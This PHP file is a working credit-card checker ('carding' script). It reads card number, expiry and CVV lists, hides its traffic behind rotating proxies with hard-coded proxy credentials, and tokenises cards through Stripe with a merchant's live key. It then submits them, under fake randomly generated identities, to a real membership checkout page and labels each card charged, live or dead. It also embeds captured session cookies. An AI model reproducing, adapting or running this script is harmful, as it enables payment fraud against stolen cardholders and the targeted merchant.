<?php

//============================================================================//
//=======================[B3 RAW-MADE BY 𝑫𝑹𝑨𝑮𝑶𝑵#𝑴𝑨𝑺𝑻𝑬𝑹]====================//
//============================================================================//
 

require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}




//==================[Randomizing Details]======================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
//==================[Randomizing Details-END]======================//


//=======================[Proxys]=============================//
$Websharegay = rand(0,250);
$rp1 = array(
  1 => 'wcfsaunx-rotate:agpoevat7mxr',
    ); 
    $rotate = $rp1[array_rand($rp1)];
//////////////////////////==============[Proxy Section]===============//////////////////////////////
$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
CURLOPT_RETURNTRANSFER => true,
CURLOPT_PROXY => 'http://p.webshare.io:80',
CURLOPT_PROXYUSERPWD => $rotate,
CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();  
if (isset($ip1)){
$ip = "Live! ✅";
}
if (empty($ip1)){
$ip = "Dead! ❌";
}
echo '[ IP: '.$ip.' ] ';
//=======================[Proxys END]=============================//


//=======================[1 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'authority: api.stripe.com',
    'method: POST',
    'path: /v1/payment_methods',
    'scheme: https',
    'accept: application/json',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=21752bb0-6896-4348-8c9e-0ffff486a728564d55&muid=742cd467-3cf5-43d5-908d-3119da7021af46029e&sid=eeb59224-519b-4cae-a4c9-1cdb4d8d98d98ba756&pasted_fields=number&payment_user_agent=stripe.js%2Fce6ebe825%3B+stripe-js-v3%2Fce6ebe825&time_on_page=15840&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1IKHhQJQRCxZW6Dh');


$result1 = curl_exec($ch);
$token = trim(strip_tags(getStr($result1,'"id": "','"'))); 
//=======================[1 REQ-END]==============================//


//=======================[2 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://thechattymammoth.com/membership-account/membership-checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'authority: thechattymammoth.com',
    'method: POST',
    'path: /membership-account/membership-checkout/',
    'scheme: https',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/x-www-form-urlencoded',
    'cookie: localTimeZone=GMT+0530; isReturningVisitor60=true; wpf_ref[original_ref]=https%3A%2F%2Fthechattymammoth.com%2Fmembership-account%2Fmembership-checkout%2F; wpf_ref[landing_page]=%2F%3FwmcAction%3DwmcTrack%26action_name%3DMembership%2520Checkout%2520%257C%2520The%2520Chatty%2520Mammoth%26siteId%3D1%26rec%3D1%26rand%3D920058%26h%3D16%26m%3D34%26s%3D38%26url%3Dhttps%253A%252F%252Fthechattymammoth.com%252Fmembership-account%252Fmembership-checkout%252F%26uid%3D0%26pid%3D60%26visitorId%3D891625e7f825f2b5%26fvts%3D1666609479%26vc%3D1%26idn%3D0%26refts%3D0%26lvts%3D1666609479%26fullRef%3Dthechattymammoth.com%252Fmembership-account%252Fmembership-checkout%252F%26send_image%3D1%26pdf%3D1%26qt%3D0%26rp%3D0%26wma%3D0%26dir%3D0%26fla%3D0%26java%3D0%26gears%3D0%26ag%3D0%26cookie%3D1%26res%3D1920x1080%26gtms%3D1012%26pvId%3Djmeb0U%26browser%3DChrome_106%26os%3DWindows_10%26device%3DDesktop; _gid=GA1.2.72460498.1666609482; _fbp=fb.1.1666609482576.689076636; __stripe_mid=742cd467-3cf5-43d5-908d-3119da7021af46029e; __insp_uid=3167980386; _wsm_ses_1_8c43=*; PHPSESSID=35f40e1c6cefeee25f1d64b2c3f20cfa; __stripe_sid=eeb59224-519b-4cae-a4c9-1cdb4d8d98d98ba756; __insp_wid=334198115; __insp_nv=false; __insp_targlpu=aHR0cHM6Ly90aGVjaGF0dHltYW1tb3RoLmNvbS9tZW1iZXJzaGlwLWFjY291bnQvbWVtYmVyc2hpcC1jaGVja291dC8%3D; __insp_targlpt=TWVtYmVyc2hpcCBDaGVja291dCB8IFRoZSBDaGF0dHkgTWFtbW90aA%3D%3D; __insp_sid=930434628; __insp_msld=true; pmpro_visit=1; sc_is_visitor_unique=rx12662336.1666684234.B9C93F94AC634FBAFD5A9EE2AF8E547A.2.2.2.2.2.2.1.1.1; _ga=GA1.1.1486714412.1666609482; _gat_gtag_UA_190268258_1=1; __insp_pad=6; _ga_F8R6BBG74R=GS1.1.1666683710.2.1.1666684257.0.0.0; _wsm_id_1_8c43=891625e7f825f2b5.1666609479.2.1666684259.1666683706; __insp_slim=1666684268597',
    'origin: https://thechattymammoth.com',
    'referer: https://thechattymammoth.com/membership-account/membership-checkout/',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'level=1&checkjavascript=1&other_discount_code=&username='.$name.'444&bemail='.$email.'&bemail='.$email.'&password='.$name.'2444&password2_copy=1&first_name='.$name.'&last_name='.$last.'&bconfirmemail_copy=1&fullname=&CardType=visa&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id='.$token.'&AccountNumber=XXXXXXXXXXXX1704&ExpirationMonth=12&ExpirationYear=2022');

$result2 = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];

//=======================[2 REQ-END]==============================//

//===========================================[Responses]========================================//


if(strpos($result2, 'Thanks for')) {
  
    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED ✅ @mtctechx</span><br>';
    exit;
    }


elseif(strpos($result2, "Your card has insufficient funds.")) {
  
    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV INSUFFICIENT FUNDS ⚠️</span><br>';
    exit;
    }

 
elseif(strpos($result2, "Your card’s security code is incorrect.")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅</span><br>';
    }    
 
 
elseif(strpos($result2, "Your card was declined.")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINE ❌ </span><br>';
    }


elseif(strpos($result2, "Your card number is incorrect.")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER ❌ </span><br>';
    }

elseif(strpos($result1, "Your card number is incorrect.")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER ❌ </span><br>';
    }

elseif(strpos($result1, "do_not_honor")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR ❌ </span><br>';

}


elseif(strpos($result1, "fraudulent")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT ❌ </span><br>';

}

elseif(strpos($result2, "Your card number is incorrect.")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER ❌ </span><br>';

}

elseif(strpos($result2, "Unkown Error Generation Your Account.")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED ❌ </span><br>';

}


else {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅</span><br>';

}

//===========================================[Responses-END]========================================//

curl_close($ch);
ob_flush();

//echo "<b>1REQ Result:</b> $result1<br><br>";
//echo "<b>2REQ Result:</b> $result2<br><br>";

//============================================================================//
//=======================[B3 RAW-MADE BY 𝑫𝑹𝑨𝑮𝑶𝑵#𝑴𝑨𝑺𝑻𝑬𝑹]====================//
//============================================================================//

?>